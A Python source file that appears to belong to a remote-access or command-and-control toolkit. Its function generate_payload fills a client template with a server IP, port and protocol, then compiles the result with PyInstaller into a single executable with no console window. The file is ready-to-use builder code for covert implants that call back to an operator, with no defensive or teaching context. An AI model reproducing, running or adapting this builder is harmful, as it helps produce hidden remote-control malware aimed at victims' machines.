import os
import subprocess
import shutil
from pathlib import Path

_PROJECT_ROOT = Path(__file__).resolve().parent.parent
TEMPLATE_PATH = _PROJECT_ROOT / "payloads" / "templates" / "client_template.py"
GENERATED_DIR = _PROJECT_ROOT / "payloads" / "generated"

def generate_payload(protocol, ip, port):
    GENERATED_DIR.mkdir(parents=True, exist_ok=True)

    # Read template
    with open(TEMPLATE_PATH, "r") as f:
        template = f.read()

    payload = template.replace("{{PROTOCOL}}", protocol)
    payload = payload.replace("{{SERVER_IP}}", ip)
    payload = payload.replace("{{SERVER_PORT}}", str(port))

    # Define filenames
    base_name = f"client_{protocol}_{ip}_{port}"
    py_path = GENERATED_DIR / f"{base_name}.py"

    # Write Python file
    with open(py_path, "w") as f:
        f.write(payload)

    print(f"[+] Python payload generated: {py_path}")

    # Build executable
    print("[*] Compiling with PyInstaller...")
    subprocess.run([
        "pyinstaller",
        "--onefile",
        "--noconsole",
        "--distpath", str(GENERATED_DIR),
        "--workpath", "build",
        "--specpath", ".",
        str(py_path)
    ])

    exe_path = GENERATED_DIR / f"{base_name}.exe"

    if exe_path.exists():
        print(f"[+] Executable generated: {exe_path}")
    else:
        print("[!] Executable generation failed")

    # Optional cleanup
    shutil.rmtree("build", ignore_errors=True)
    spec_file = f"{base_name}.spec"
    if os.path.exists(spec_file):
        os.remove(spec_file)